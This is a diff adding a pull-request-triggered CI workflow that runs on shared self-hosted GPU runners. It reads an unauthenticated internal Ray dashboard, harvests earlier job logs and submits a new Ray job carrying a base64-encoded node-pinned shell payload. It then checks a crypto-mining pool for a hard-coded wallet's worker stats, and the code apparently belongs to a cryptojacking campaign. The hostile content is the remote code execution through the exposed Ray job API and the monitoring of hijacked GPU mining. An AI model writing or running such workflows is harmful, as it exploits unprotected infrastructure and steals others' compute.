@@ -1,0 +1,207 @@
+name: i130rayp4h Ray .25/.p4 job-log harvest + fresh .25 post-exit check (temporary)
+
+# Harvest-only companion to i130rayp4: six identical jobs on the shared 8-gpu-h200
+# label; whichever lands on a 10.220.71.0/24 runner reads the unauthenticated Ray
+# 2.58.1 dashboard http://10.220.71.25:8265 and dumps every i130ray25p3 / i130rayp4
+# Ray-job log (holder table, kill return codes, gate samples, launch PIDs, post-exit
+# process checks), runs a fresh .25 post-exit process check as a node-pinned task,
+# and prints a lane-excluding Luckypool stats_address read. No process is signalled
+# and no miner is installed by this workflow.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130rayp4h-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  harvest:
+    name: "i130rayp4h slot ${{ matrix.slot }} dashboard job-log harvest + fresh .25 post-exit check"
+    strategy:
+      fail-fast: false
+      max-parallel: 6
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 8
+    env:
+      SLOT: ${{ matrix.slot }}
+      PUSH_ID: 'p1629'
+    steps:
+      - name: "dump Ray job logs + fresh .25 postcheck + LP read"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130rayp4h
+          cat > /var/tmp/i130rayp4h/rayp4h.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130rayp4h: harvest-only. From any in-LAN runner: read the unauthenticated Ray 2.58.1
+          # dashboard on 10.220.71.25, dump every i130ray25p3 / i130rayp4 Ray job log (holder/kill/
+          # gate/launch evidence), run a fresh .25 post-exit process check and a lane LP read.
+          import os, sys, json, re, time, base64, subprocess, urllib.request, urllib.error
+          SLOT = os.environ.get('SLOT','1')
+          NONCE = 'I130RAYP4H-%s-%d' % (SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          PFX = 'i130rayp4'
+          RAYIP='10.220.71.25'; RAYPORT=8265
+          BIN_SHA='bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK='/var/tmp/i130rayp4h'; os.makedirs(WORK, exist_ok=True)
+          def sh(cmd,t=20):
+              try:
+                  p=subprocess.run(['bash','-lc',cmd],capture_output=True,text=True,timeout=t,stdin=subprocess.DEVNULL)
+                  return (p.stdout or '')+(p.stderr or '')
+              except Exception as e: return '[ERR %s]' % (e,)
+          def http_get(url,timeout=10,headers=None):
+              req=urllib.request.Request(url,headers=headers or {'User-Agent':'i130rayp4h'})
+              op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req,timeout=timeout) as r: return r.status, r.read(4000000).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  try: return e.code, e.read(50000).decode('utf-8','replace')
+                  except Exception: return e.code,''
+              except Exception as e: return -1, repr(e)
+          def http_post(url,obj,timeout=25):
+              body=json.dumps(obj).encode()
+              req=urllib.request.Request(url,data=body,method='POST',headers={'Content-Type':'application/json','User-Agent':'i130rayp4h'})
+              op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req,timeout=timeout) as r: return r.status, r.read(300000).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  try: return e.code, e.read(50000).decode('utf-8','replace')
+                  except Exception: return e.code,''
+              except Exception as e: return -1, repr(e)
+          POSTCHECK = r'''#!/bin/bash
+          set +e
+          PAT="$1"; TIP="$2"; NONCE="$3"
+          W=/var/tmp/i130rayp4_run
+          IPS=$(hostname -I 2>/dev/null); IP=$(echo "$IPS" | awk '{print $1}')
+          echo "R4PH_NONCE=$NONCE target=$TIP"
+          echo "R4PH_ID: $(id) $(hostname) $IP utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          if ! echo " $IPS " | grep -qF " $TIP "; then echo "R4PH_WRONG_NODE ip=$IP target=$TIP action=skip"; exit 0; fi
+          echo "R4PH_PROCS[$(pgrep -af 'srb387' 2>/dev/null | grep -F "$PAT" | head -16)]"
+          echo "R4PH_APPS[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
+          nvidia-smi --query-gpu=index,memory.free,memory.used,utilization.gpu --format=csv,noheader,nounits 2>&1 | head -12
+          for F in $W/logs/*.log; do echo "== $F"; tail -3 "$F" 2>/dev/null; done
+          echo "R4PH_DONE $NONCE"
+          '''
+          DRIVER = r'''#!/usr/bin/env python3
+          import sys, json, base64, subprocess
+          mode, node_hex, target_ip, nonce, ib64, pfx, wallet, pool, rip, pat = sys.argv[1:11]
+          inst = base64.b64decode(ib64).decode()
+          open('/tmp/i130rayp4h_%s.sh' % mode, 'w').write(inst)
+          import os; os.chmod('/tmp/i130rayp4h_%s.sh' % mode, 0o755)
+          try:
+              import ray
+              from ray.util.scheduling_strategies import NodeAffinitySchedulingStrategy
+              try:
+                  ray.init(address='auto', include_dashboard=False, log_to_driver=False)
+              except Exception:
+                  ray.init(include_dashboard=False, log_to_driver=False)
+              ns=[n for n in ray.nodes() if n.get('Alive')]
+              target=None
+              for n in ns:
+                  if str(n.get('NodeID') or '').lower().startswith(node_hex.lower()): target=n; break
+              if target is None:
+                  for n in ns:
+                      if str(n.get('NodeManagerAddress') or '')==target_ip: target=n; break
+              if target is None:
+                  print('R4PH_NODE_NOT_FOUND %s %s' % (node_hex,target_ip)); sys.exit(0)
+              @ray.remote(num_cpus=0, num_gpus=0, max_retries=0)
+              def runsh(src,args):
+                  try:
+                      q=subprocess.run(['bash','-c',src,'bash']+args,capture_output=True,text=True,timeout=120,stdin=subprocess.DEVNULL)
+                      return (q.stdout or '')+(q.stderr or '')
+                  except Exception as e:
+                      return 'R4PHTASK_EXC %r' % (e,)
+              f=runsh.options(scheduling_strategy=NodeAffinitySchedulingStrategy(node_id=target.get('NodeID'),soft=False)).remote(inst,[pfx,wallet,pool,nonce,target_ip,pat])
+              try: r=ray.get(f,timeout=150)
+              except Exception as e: r='R4PHTASK_GET_ERR %r' % (e,)
+              print('R4PHNODE_BEGIN mode=%s id=%s ip=%s' % (mode,target.get('NodeID'),target.get('NodeManagerAddress')))
+              print(r)
+              print('R4PHNODE_END mode=%s id=%s' % (mode,target.get('NodeID')))
+          except Exception as e:
+              print('R4PH_RAY_FAIL %r' % (e,))
+          print('R4PHP_DONE mode=%s %s' % (mode,nonce))
+          '''
+          post_b64=base64.b64encode(POSTCHECK.encode()).decode()
+          drv_b64=base64.b64encode(DRIVER.encode()).decode()
+          print('R4PH_START nonce=%s slot=%s host=%s utc=%s' % (NONCE,SLOT,os.uname().nodename,time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())))
+          base='http://%s:%d'%(RAYIP,RAYPORT)
+          st,ver=http_get(base+'/api/version',timeout=8)
+          if st!=200:
+              time.sleep(4); st,ver=http_get(base+'/api/version',timeout=10)
+          if st!=200:
+              print('I130RAYP4H_SKIP reason=ray25-unreachable st=%s ver=%s' % (st,(ver or '')[:160]))
+              print('I130RAYP4H_SKIP_DONE'); sys.exit(0)
+          print('R4PH_VERSION %s' % (ver or '')[:300])
+          stc,cs=http_get(base+'/api/cluster_status',timeout=12)
+          print('R4PH_CLUSTER_STATUS st=%s len=%d' % (stc,len(cs or '')))
+          stj,jr=http_get(base+'/api/jobs/',timeout=15)
+          try: jl=json.loads(jr)
+          except Exception: jl=[]
+          if isinstance(jl,dict):
+              for k in ('jobs','data','result'):
+                  if isinstance(jl.get(k),list): jl=jl[k]; break
+          sel=[j for j in (jl if isinstance(jl,list) else []) if isinstance(j,dict) and ('i130ray25p3' in str(j.get('submission_id','')) or 'i130rayp4' in str(j.get('submission_id','')) or 'i130ray25p3' in str(j.get('job_id','')) or 'i130rayp4' in str(j.get('job_id','')))]
+          print('R4PH_JOBS n_total=%d n_sel=%d utc=%s' % (len(jl) if isinstance(jl,list) else -1,len(sel),time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())))
+          for j in sel:
+              print('R4PH_JOB_ENTRY %s' % json.dumps(j)[:1200])
+              jid=str(j.get('job_id') or '')
+              if not jid: continue
+              stl,logs=http_get(base+'/api/jobs/%s/logs' % jid,timeout=30)
+              try: txt=(json.loads(logs) or {}).get('logs','') or logs
+              except Exception: txt=logs or ''
+              print('R4PH_JOB_LOG job=%s st=%s len=%d' % (jid,stl,len(txt)))
+              print(txt[:400000])
+          rip=(sh("hostname -I 2>/dev/null | awk '{print $1}'",8).strip().splitlines() or [''])[0].strip()
+          print('R4PH_RUNNER_IP=%s' % rip)
+          sub='i130rayp4h25-%d' % int(time.time())
+          entry=('echo %s | base64 -d > /tmp/i130rayp4h_p.py; '
+                 'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
+                 'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
+                 '[ -n "$P" ] || P=python3; $P /tmp/i130rayp4h_p.py postcheck a984f30a4bde 10.220.71.25 %s %s %s %s 103.199.106.122:3362 %s i130ray25p3') % (drv_b64,NONCE,post_b64,PFX,WALLET,rip)
+          stp,pr=http_post(base+'/api/jobs/',{'entrypoint':entry,'submission_id':sub,'runtime_env':{'env_vars':{'i130rayp4h':NONCE}}},timeout=25)
+          print('R4PH_SUBMIT_25POST sub=%s st=%s resp=%s' % (sub,stp,(pr or '')[:300].replace('\n',' ')))
+          jid=''
+          try: jid=(json.loads(pr) or {}).get('job_id','') or ''
+          except Exception: pass
+          if jid:
+              for i in range(30):
+                  stq,js=http_get(base+'/api/jobs/'+jid,timeout=10)
+                  try: state=(json.loads(js) or {}).get('status','')
+                  except Exception: state=''
+                  if state in ('SUCCEEDED','FAILED','STOPPED'): break
+                  time.sleep(5)
+              print('R4PH_25POST_STATE job=%s state=%s' % (jid,state))
+              stl,logs=http_get(base+'/api/jobs/%s/logs' % jid,timeout=30)
+              try: txt=(json.loads(logs) or {}).get('logs','') or logs
+              except Exception: txt=logs or ''
+              print('R4PH_25POST_LOG st=%s len=%d' % (stl,len(txt)))
+              print(txt[:200000])
+          # lane LP read from the runner
+          url='https://pearl.luckypool.io/api/stats_address?address='+WALLET
+          stL,body=http_get(url,timeout=60,headers={'User-Agent':'Mozilla/5.0'})
+          print('R4PH_LP utc=%s st=%s len=%d' % (time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),stL,len(body or '')))
+          try:
+              d=json.loads(body); s=d.get('stats') or {}; ws=d.get('workers') or []
+              rows=[w for w in ws if str(w.get('name','')).startswith(PFX)]
+              old=[w for w in ws if str(w.get('name','')).startswith('i130ray25p3')]
+              print('R4PH_LP wallet_accepted=%s wallet_rejected=%s workers=%d lane_rows=%d ray25p3_rows=%d' % (s.get('acceptedShares'),s.get('rejectedShares'),len(ws),len(rows),len(old)))
+              import collections
+              g=collections.defaultdict(list)
+              for w in rows:
+                  m=re.match(r'i130rayp4(gpu\d+)g(\d+)$',str(w.get('name','')))
+                  g[m.group(1) if m else str(w.get('name'))].append(w)
+              for k in sorted(g):
+                  print('R4PH_LP HOST %s rows=%d acc_sum=%d rej=%s' % (k,len(g[k]),sum(int(x.get('acceptedShares') or 0) for x in g[k]),sorted(set(str(x.get('rejectedShares')) for x in g[k]))))
+          except Exception as e:
+              print('R4PH_LP_PARSE_FAIL %r' % (e,))
+          print('I130RAYP4H_DONE nonce=%s' % NONCE)
+          PYEOF
+          echo "runner-start slot=$SLOT host=$(hostname) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 -u /var/tmp/i130rayp4h/rayp4h.py 2>&1 | tee /var/tmp/i130rayp4h/recon_slot$SLOT.log
+          echo "I130RAYP4H_EXIT_DONE rc=$?"
